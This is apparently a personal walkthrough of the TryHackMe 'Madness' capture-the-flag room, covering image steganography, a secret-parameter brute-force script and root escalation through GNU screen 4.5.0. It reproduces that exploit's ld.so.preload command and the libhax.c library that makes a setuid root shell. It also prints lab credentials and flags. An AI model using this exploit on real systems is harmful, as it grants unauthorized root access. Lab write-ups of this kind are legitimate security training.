# Tryhackme.com Room : Madness
`https://tryhackme.com/room/madness`


# Instance
```
export IP=10.10.52.81
```

# Nmap
```
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ac:f9:85:10:52:65:6e:17:f5:1c:34:e7:d8:64:67:b1 (RSA)
|   256 dd:8e:5a:ec:b1:95:cd:dc:4d:01:b3:fe:5f:4e:12:c1 (ECDSA)
|_  256 e9:ed:e3:eb:58:77:3b:00:5e:3a:f5:24:d8:58:34:8e (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
```

Running `gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://$IP` we find nothing.

Looking at the source of the default page. We find some funny things..

The is a link to
```
thm.jpg
```

Looking at an hexdump of the image, we see a `png` header for a `jpg` file.

We replace the first bytes of the file with the header for jpeg:
```
FF D8 FF E0 00 00 4A 46 49 46 00
```

We open it and see text on the image:
```
Hidden Directory
/th1s_1s_h1dd3n
```

The website seems o be looking for a secret code. But what is the query parameter ?

Looking at the html we find this mention:
```
It's between 0-99 but I don't think anyone will look here
```

To enter a secret we GET at :
```
/th1s_1s_h1dd3n/?secret=0
```

Let's just bruteforce this quickly with this script :
```py
import requests

ip = "10.10.52.81"

for i in range(0,99):
	print(f"Trying secret : {i}")
	r = requests.get(f"http://{ip}/th1s_1s_h1dd3n/?secret={i}")

	if 'wrong' not in r.text:
		print(f"The secret code is {i}")
		break
```

We get the secret code:
```
73
```

We find the string
```
Urgh, you got it right! But I won't tell you who I am! y2RPJ4QaPF!B
```
Can't find the format for this... `y2RPJ4QaPF!B`


Can't find anything..

Oh well... Looking at the write up. We had to steghide the image that is on the challenge page...not on the machine.

There is no passphrase and we get `password.txt`
```
I didn't think you'd find me! Congratulations!

Here take my password

*axA&GF8dP
```

So again. had too lookup in the write up. Tried steghide on the image but it didn't work. Turns out i corrupted my image somehow. I redownloaded it, changed the headers again and used `y2RPJ4QaPF!B` as passphrase. I got :
```
Fine you found the password! 

Here's a username 

wbxre

I didn't say I would make it easy for you!
```

Seems like the username is ROTed (Well, there was a hint about it.. :P)

It's ROT13 with
```
joker
```

So we got the credentials:
```
joker:*axA&GF8dP
```

And we're finally in...

We get the user flag `cat /home/joker/user.txt`
```
THM{d5781e53b130efe2f94f9b0354a5e4ea}
```

our user is not in sudo.

There is nothing more in `/var/www/html` and there is no other users

Let's find `SUID` binaries `find / -perm -4000 2>/dev/null`:
```
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/bin/vmware-user-suid-wrapper
/usr/bin/gpasswd
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/sudo
/bin/fusermount
/bin/su
/bin/ping6
/bin/screen-4.5.0
/bin/screen-4.5.0.old
/bin/mount
/bin/ping
/bin/umount
```

We can probably do something with `screen`. 

Nothing on gtfobins tho.

Looking on the internet i find this exploit `https://www.exploit-db.com/exploits/41154`

The exploit load a shared library using 
```bash
screen -D -m -L ld.so.preload echo -ne  "\x0a/tmp/libhax.so"
```

`libhax.c` :
```c
/tmp/libhax.c
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
__attribute__ ((__constructor__))
void dropshell(void){
    chown("/tmp/rootshell", 0, 0);
    chmod("/tmp/rootshell", 04755);
    unlink("/etc/ld.so.preload");
    printf("[+] done!\n");
}
```

Basically, this exploit allow us to write root files.

I was thinking that we might be able to write to crontabs and get a root reverse shell or something but it didn't work.

Files written by screen are owned by `root` but part of group `joker` (because suid).
Cron file must be owned by root to be runned.
I guess that's why i couldn't write over `/etc/crontab`. Can't write in the correct group.


We run it and get root
```
uid=0(root) gid=0(root) groups=0(root),1000(joker)
```

And the flag `cat /root/root.txt`
```
THM{5ecd98aa66a6abb670184d7547c8124a}
```


